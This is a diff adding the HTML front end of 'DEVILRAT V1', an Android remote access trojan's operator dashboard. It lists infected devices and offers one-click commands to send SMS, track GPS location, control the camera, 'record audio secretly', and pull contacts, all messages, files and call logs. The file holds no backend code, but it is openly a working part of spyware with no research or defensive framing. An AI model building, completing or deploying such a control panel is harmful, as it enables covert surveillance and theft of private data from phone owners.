@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>👹 DEVILRAT V1 | piwzsky</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Exo+2:wght@300;400;600&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/x-icon" href="assets/devil-logo.svg">
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loading-container">
+            <div class="devil-loader">
+                <div class="horn left"></div>
+                <div class="horn right"></div>
+                <div class="face">👹</div>
+            </div>
+            <div class="loading-text">
+                <span class="loading-title">DEVILRAT V1</span>
+                <span class="loading-subtitle">Initializing Darkness...</span>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+                <div class="loading-stats">
+                    <div class="stat"><i class="fas fa-server"></i> Server: <span id="serverStat">CONNECTING</span></div>
+                    <div class="stat"><i class="fas fa-satellite-dish"></i> WebSocket: <span id="wsStat">INITIALIZING</span></div>
+                    <div class="stat"><i class="fas fa-shield-alt"></i> Security: <span id="secStat">ACTIVATING</span></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main App (Hidden initially) -->
+    <div class="app-container" id="appContainer">
+        <!-- Navigation -->
+        <nav class="devil-nav">
+            <div class="nav-left">
+                <div class="logo">
+                    <i class="fas fa-skull-crossbones"></i>
+                    <span>DEVILRAT <strong>V1</strong></span>
+                </div>
+                <div class="dev-badge">
+                    <i class="fas fa-code"></i>
+                    <span>piwzsky</span>
+                </div>
+            </div>
+            <div class="nav-right">
+                <div class="connection-status connected" id="connectionStatus">
+                    <i class="fas fa-wifi"></i>
+                    <span>CONNECTED</span>
+                </div>
+                <div class="time-display" id="timeDisplay">00:00:00</div>
+            </div>
+        </nav>
+
+        <!-- Dashboard -->
+        <div class="dashboard">
+            <!-- Stats Cards with Animation -->
+            <div class="stats-grid">
+                <div class="stat-card" data-aos="fade-up">
+                    <div class="stat-icon"><i class="fas fa-mobile-alt"></i></div>
+                    <div class="stat-value" id="deviceCount">0</div>
+                    <div class="stat-label">DEVICES</div>
+                    <div class="stat-trend up"><i class="fas fa-arrow-up"></i> Live</div>
+                </div>
+                <div class="stat-card" data-aos="fade-up" data-aos-delay="100">
+                    <div class="stat-icon"><i class="fas fa-bolt"></i></div>
+                    <div class="stat-value" id="commandCount">0</div>
+                    <div class="stat-label">COMMANDS</div>
+                    <div class="stat-trend"><i class="fas fa-terminal"></i> Active</div>
+                </div>
+                <div class="stat-card" data-aos="fade-up" data-aos-delay="200">
+                    <div class="stat-icon"><i class="fas fa-shield-alt"></i></div>
+                    <div class="stat-value" id="onlineCount">0</div>
+                    <div class="stat-label">ONLINE</div>
+                    <div class="stat-trend up"><i class="fas fa-signal"></i> Strong</div>
+                </div>
+                <div class="stat-card" data-aos="fade-up" data-aos-delay="300">
+                    <div class="stat-icon"><i class="fas fa-database"></i></div>
+                    <div class="stat-value" id="memoryUsage">∞</div>
+                    <div class="stat-label">POWER</div>
+                    <div class="stat-trend"><i class="fas fa-infinity"></i> Unlimited</div>
+                </div>
+            </div>
+
+            <!-- Main Content -->
+            <div class="content-grid">
+                <!-- Device List Panel -->
+                <div class="panel device-panel" data-aos="fade-right">
+                    <div class="panel-header">
+                        <h2><i class="fas fa-satellite-dish"></i> CONNECTED DEVICES</h2>
+                        <button class="btn-refresh" onclick="loadDevices()">
+                            <i class="fas fa-sync-alt"></i> Refresh
+                        </button>
+                    </div>
+                    <div class="device-list" id="deviceList">
+                        <div class="empty-state">
+                            <i class="fas fa-ghost"></i>
+                            <p>No devices connected</p>
+                            <small>Waiting for Android devices...</small>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Quick Actions -->
+                <div class="panel actions-panel" data-aos="fade-left">
+                    <div class="panel-header">
+                        <h2><i class="fas fa-bolt"></i> QUICK ACTIONS</h2>
+                        <div class="panel-subtitle">Tap to execute command</div>
+                    </div>
+                    <div class="actions-grid">
+                        <div class="action-card sms" onclick="showCommandModal('sms')" data-aos="zoom-in">
+                            <div class="action-icon"><i class="fas fa-sms"></i></div>
+                            <div class="action-title">SEND SMS</div>
+                            <div class="action-desc">Send message to any number</div>
+                        </div>
+                        <div class="action-card location" onclick="showCommandModal('location')" data-aos="zoom-in" data-aos-delay="50">
+                            <div class="action-icon"><i class="fas fa-map-marker-alt"></i></div>
+                            <div class="action-title">GET LOCATION</div>
+                            <div class="action-desc">Real-time GPS tracking</div>
+                        </div>
+                        <div class="action-card camera" onclick="showCommandModal('camera')" data-aos="zoom-in" data-aos-delay="100">
+                            <div class="action-icon"><i class="fas fa-camera"></i></div>
+                            <div class="action-title">CAMERA</div>
+                            <div class="action-desc">Front/Back camera control</div>
+                        </div>
+                        <div class="action-card mic" onclick="showCommandModal('mic')" data-aos="zoom-in" data-aos-delay="150">
+                            <div class="action-icon"><i class="fas fa-microphone"></i></div>
+                            <div class="action-title">MICROPHONE</div>
+                            <div class="action-desc">Record audio secretly</div>
+                        </div>
+                        <div class="action-card contacts" onclick="executeCommand('contacts')" data-aos="zoom-in" data-aos-delay="200">
+                            <div class="action-icon"><i class="fas fa-address-book"></i></div>
+                            <div class="action-title">CONTACTS</div>
+                            <div class="action-desc">Extract contact list</div>
+                        </div>
+                        <div class="action-card messages" onclick="executeCommand('messages')" data-aos="zoom-in" data-aos-delay="250">
+                            <div class="action-icon"><i class="fas fa-comment-alt"></i></div>
+                            <div class="action-title">MESSAGES</div>
+                            <div class="action-desc">Read all SMS/MMS</div>
+                        </div>
+                        <div class="action-card files" onclick="executeCommand('files')" data-aos="zoom-in" data-aos-delay="300">
+                            <div class="action-icon"><i class="fas fa-folder"></i></div>
+                            <div class="action-title">FILES</div>
+                            <div class="action-desc">Browse device storage</div>
+                        </div>
+                        <div class="action-card call" onclick="executeCommand('calls')" data-aos="zoom-in" data-aos-delay="350">
+                            <div class="action-icon"><i class="fas fa-phone"></i></div>
+                            <div class="action-title">CALL LOGS</div>
+                            <div class="action-desc">View call history</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Command Logs -->
+                <div class="panel logs-panel" data-aos="fade-up">
+                    <div class="panel-header">
+                        <h2><i class="fas fa-terminal"></i> COMMAND LOGS</h2>
+                        <div class="panel-actions">
+                            <button class="btn-small" onclick="clearLogs()">
+                                <i class="fas fa-trash"></i> Clear
+                            </button>
+                            <button class="btn-small" onclick="exportLogs()">
+                                <i class="fas fa-download"></i> Export
+                            </button>
+                        </div>
+                    </div>
+                    <div class="logs-container">
+                        <div class="log-list" id="logList">
+                            <div class="log-item system">
+                                <div class="log-time">[SYSTEM]</div>
+                                <div class="log-message">DEVILRAT V1 initialized successfully</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Bottom Navigation -->
+        <div class="bottom-nav">
+            <button class="nav-btn active" onclick="showSection('dashboard')">
+                <i class="fas fa-tachometer-alt"></i>
+                <span>Dashboard</span>
+            </button>
+            <button class="nav-btn" onclick="showSection('devices')">
+                <i class="fas fa-mobile-alt"></i>
+                <span>Devices</span>
+            </button>
+            <button class="nav-btn" onclick="showSection('commands')">
+                <i class="fas fa-terminal"></i>
+                <span>Commands</span>
+            </button>
+            <button class="nav-btn" onclick="showSection('settings')">
+                <i class="fas fa-cog"></i>
+                <span>Settings</span>
+            </button>
+        </div>
+
+        <!-- Connection Info -->
+        <div class="connection-info">
+            <div class="info-item">
+                <i class="fas fa-server"></i>
+                <span id="serverUrl">Loading...</span>
+            </div>
+            <div class="info-item">
+                <i class="fas fa-plug"></i>
+                <span>Dual WebSocket: <span id="wsStatus">Active</span></span>
+            </div>
+            <div class="info-item">
+                <i class="fas fa-user"></i>
+                <span>Developer: <strong>piwzsky</strong></span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modals -->
+    <div class="modal" id="commandModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 id="modalTitle"><i class="fas fa-terminal"></i> COMMAND PANEL</h3>
+                <button class="modal-close" onclick="closeModal()">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+            <div class="modal-body" id="modalBody">
+                <!-- Dynamic content -->
+            </div>
+        </div>
+    </div>
+
+    <div class="modal" id="deviceModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3><i class="fas fa-mobile-alt"></i> SELECT DEVICE</h3>
+                <button class="modal-close" onclick="closeDeviceModal()">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+            <div class="modal-body">
+                <div class="device-select-list" id="deviceSelectList"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Scripts -->
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+    <script src="loading.js"></script>
+    <script src="script.js"></script>
+</body>
+                                        </html>
